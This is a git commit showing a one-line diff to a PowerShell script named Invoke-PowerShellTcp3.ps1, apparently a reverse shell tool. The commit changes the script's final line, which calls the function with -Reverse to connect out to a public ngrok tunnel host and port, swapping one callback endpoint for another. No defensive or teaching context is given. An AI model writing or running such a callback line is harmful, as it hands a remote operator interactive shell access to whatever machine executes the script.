13c268208e814ddf45e63b6a8bfee618ab72a54b
JohnFPy <132300580+JohnFPy@users.noreply.github.com>
2025-01-25 08:11:24 -0500

    Update Invoke-PowerShellTcp3.ps1

--- Invoke-PowerShellTcp3.ps1
+++ Invoke-PowerShellTcp3.ps1
@@ -88,4 +88,4 @@ function Invoke-PowerShellTcp3
     }
 }
 
-Invoke-PowerShellTcp3 -Reverse -IPAddress 4.tcp.ngrok.io -Port 16110
+Invoke-PowerShellTcp3 -Reverse -IPAddress 0.tcp.ngrok.io -Port 13401
